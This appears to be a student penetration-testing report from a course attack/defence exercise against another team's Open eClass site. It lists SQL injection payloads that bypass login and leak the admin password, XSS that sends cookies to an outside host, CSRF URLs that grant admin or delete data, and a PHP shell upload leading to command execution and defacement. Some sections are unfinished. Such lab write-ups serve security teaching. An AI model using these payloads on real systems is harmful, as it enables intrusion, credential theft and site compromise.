# TODO:
- CSRF
- Sqli requests presentation
- XSS payloads: script and XHR
- give admin to user csrf
- ToC

## Intro

- The `Target` team was **sloppy-clowns-0** and their website was to be found @ [http://sloppy-clowns-0.csec.chatzi.org](http://sloppy-clowns-0.csec.chatzi.org).

- Credentials found via the [defacement](#deface) are available in [creds file](./puppies/creds).

- The opposition's website seemed close to the vanilla version provided in the context of this assignment, hence anything goes and this report is rather exhaustive.

- For this reason, and because most attacks are good to go, the main exploitation scenario for defacement will be shown and some additional scenarios of interest in regards of higher complexity and greater reliance and persistence.

- The website's URL mentioned above is considered as the base of the attacks and will not be provided in the attacks below for brevity.


## SQL Injections

SQL Injections have been performed with the following 2 resources in hand. The first explains payloads for the identification of vulnerable sites and authentication bypasses and the second provides help for fully weaponizing UNION-based, blind and time-based attacks.

1. [SQL Injections - PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
2. [MySQL Injections specific cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

Below are the main vulnerable sites that provide leeway for information disclosure and auth bypass. Payloads show how to leak the admin's password or the exact "secret" location of a malicious file uploaded via the [RFI section's](#rfi) attacks.

<details> <summary>High - SQL Injection in URL 1 - Parameter `parameter1`</summary> </details>

### `/upgrade/index.php`
We are prompted to login to update the database.
Via this login we submit a POST request to `/upgrade/upgrade.php` where the `login` parameter is vulnerable. We supply the below to become admin, the `password` paramter can be left empty. 

```
' OR user.user_id='1' OR '1'='1
```

## `/modules/phpbb/`

### _reply.php_ @ **topic** parameter

```/phpbb/reply.php?topic=1 AND 12 = 13) UNION SELECT NULL, NULL, NULL, password FROM eclass.user -- &forum=1
```


### _viewtopic.php_ @ **topic** parameter
- `/modules/phpbb/viewtopic.php`
```
?topic=1 AND 12 = 13 ) UNION SELECT NULL, NULL FROM eclass.user WHERE username="drunkadmin" -- &forum=1```
```

### `modules/unreguser/unregcours.php`
```
?cid=TMA100'AND 0=1 UNION SELECT password FROM eclass.user WHERE username="drunkadmin" OR 'ACID'='ACID & u=3
```

### `modules/work/work.php`
```
?id=1%27%20AND%201=2%20UNION%20SELECT%201,password,3,4,5,6,7,8,9,10%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20–
```
++ profile
++ search
++ opencourses

## XSS

XSS injections can be performed in every URL path of the application by adding a slash and escaping the html element of $_SERVER[PHP_SELF] variable, which is most usually done via `"><script> alert('BOYKA') </script>`.

We will show 2 possible exploitation paths. One is simply running a <script></script> tag's code and the other is performing an XHR. The first is good enough for performing simple queries, while the XHR method can include a script of ad-hoc many lines of javascript code that can do a multitude of different stuff.

```js
<script>
	document.location='http://melenetzon.puppies.chatzi.org/cookie_recv.php?biscuit='+document.cookie;
</script>
```

```js
<script src="melenetzon.puppies.chatzi.org/xhr.js"></script>
```

Additionally:
- adminannouncements.php
- profile.php
- myagenda.php 
- lostpass.php 
    `/modules/auth/lostpass.php?userName=%3Cscript%3Ealert(1213)%3C/script%3E&email=yury@boyka.ru&doit=%CE%91%CF%80%CE%BF%CF%83%CF%84%CE%BF%CE%BB%CE%AE`
- newuser.php 
- messageList.php 
- dropbox_submit.php 

## CSRF

The below CSRF attacks have been performed by hand, after the initial exploitation of the application and achieving admin access.

There is some CSRF protection that has shown itself here and there, but it's not functioning properly, therefore allowing most csrf attacks to take place. It can be seen via the [special attack](#the-let-me-fix-your-code-attack), where csrf tokens are all over the code but they fail to be included in post or get requests.


* `/modules/user/user.php?giveAdmin=4`:
Gives admin access to user with id == 4 (if drunkadmin is focused on the course).

* `/modules/admin/addfaculte.php?a=2&c=13`:
Deletes course with cid == 13.

* `/modules/admin/delcours.php?c=TMA102&delete=yes`:
Deletes a course named TMA102, or anything else you want.

* `/modules/admin/unreguser.php?u=9&c=&doit=yes`:
Deletes user with id == 9.

## RFI

### Abstract
In this context, `RFI` refers to **Remote File Inclusion** and can be sometimes be confused with `LFI` (Local File Inclusion).
The methodologies used in the context of this application refer to uploading files to achieve RFI (`localize` doesn't count).

[More on Upload bypass and exploitation](https://book.hacktricks.xyz/pentesting-web/file-upload).


### Intro
There is no protection for directory listing, meaning that when we upload a file, even though there is by default some randomization on it's name we can just list the folder of the course, either `/dropbox/` or `/work/` and find it's name.

Additionally, there is no filtering or post-processing to the uploaded files, meaning we can achieve code execution (RCE) easily by providing our own PHP code, either via a .php, .pht or a multitude of other extensions.

### Dropbox

Make a user and enroll in the course. Go to file exchange and upload a php file (i.e [cmd.php](./puppies/cmd.php)). List the directory by going to `<URL>/courses/<course>/dropbox/`, the file is clickable and will be executed by the web server.

In this context we can achieve code executio

### Work

`/modules/work/work.php`, was malfunctioning after several rounds of attacks so a de facto test could not be performed without a reset of the app.

Regardless, the methodology would be to proceed as above by trying to bypass the upload form to include our own executable code (.php, .php5, etc; formats that the Apache2 web server would interpret as code and execute). Then proceed with finding the path of the uploaded file and achieving RCE.

- If there were protections set up in place, bypass them; i.e. the saved file would be saved as non executable, then we could try to bypass the upload location and achieve arbitrary file write and try to change the configuration of webapp to allow ourselves in.

- In case, of changed extension on save, we could try to use a NULL byte exploit, which is a predominant security vulnerability in PHP5.

### Other RFI locations
- `/modules/course_tools/course_tools.php`, by uploading a site in the course (described in [deface](#deface)).
- `/modules/import/import.php`.
- `/modules/document/document.php`, (**Course Admin only**, after enabling the module), **BUT** it has been entirely deleted by the opponent team.


## Deface

1. Browse to `/upgrade/index.php`.

2. Auth bypass with [upgrade auth bypass vulnerability](#upgradeindexphp) to become admin

3. Go to `modules/admin/eclassconf.php` and get MySQL credentials (the mysql pass is the same for the drunkadmin user in this scenario, but in general these 2 should defer).

4. From there browse to `/modules/admin/mysqli` or just click the `Database management (phpMyAdmin)`. Login with the found mysql credentials and extract the password of the admin user (hashed).

5. Go to active Course TMA100, and select `Tool Activation` as admin of the course.

6. Try to upload a webpage via `modules/course_tools/course_tools.php?action=1`, aka website upload. The same can be done via `modules/import/import.php`.

7. It accepts only html pages, but we can easily bypass with a multitude of ways, such as a proxy or upload option.

8. Initially I uploaded a php reverse shell. It timed-out; potentially due to the docker environment the application is in.

9. Upload [art_power](./puppies/art_power) funky webpage that we want to substitute for index.php in the root of the app. Then upload and click [deface2.php](./puppies/deface2.php) script.

10. Alternatively we could use the [cmd.php](./puppies/cmd.php) script and achieve command execution inside the Linux environment via the cmd GET parameteter.


## Other attack scenarios

1. Get admin cookie via XSS && CSRF -> proceed as above

2. Make my user an admin of the course and proceed with fetching the `Αντίγραφο ασφαλείας του μαθήματος`, inside there is a `backup.php` file with all the users enrolled in the course and if admin is enrolled we get his/her credentials.

3. Command execution via RFI on dropbox and work.

4. 


## The "Let me fix your code" attack

Using the aforementioned [cmd.php](./puppies/cmd.php) file we can run commands in the system.

Running `tar czvf ../../../eclass.tgz /var/www/openeclass/` gives us a tarball at the `/openeclass.tgz` path of the site allowing us to inspect the source code and instrument properly the all of our attacks.

Upon review of the source code it's possible to reach certain conclusions that were already suspicions while initially testing the site:
    a. There is no sanitization on the PHP_SELF value, meaning that in most pages the `$_SERVER['PHP_SELF']` value is vulnerable to XSS. 
    b. CSRF protection is not enabled for most of the pages.
    c. RFI on `dropbox` and `work` modules is unprotected.

# Free-for-All

For the purposes of the Free4ll phase (if it takes place) the script [autosploit.py](./puppies/autosploit.py) has been created with the above mentioned context.